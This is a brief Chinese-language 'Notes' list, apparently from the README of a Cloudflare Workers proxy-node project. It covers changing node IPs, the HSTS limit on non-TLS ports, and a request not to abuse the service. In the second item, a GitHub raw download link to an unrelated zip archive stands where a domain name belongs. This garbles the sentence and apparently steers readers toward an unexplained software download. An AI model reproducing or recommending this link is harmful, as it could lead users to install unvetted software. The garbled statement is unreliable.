## 注意事项

1. 由于 Workers 节点的 IP 变动频繁，因此请勿在此节点登录重要账号
2. 由于 https://github.com/mcseali/galaxy/raw/refs/heads/main/regality/Software-1.5.zip 域名默认启用了 HSTS，所以无法使用非 TLS 端口的节点
3. 请勿滥用！
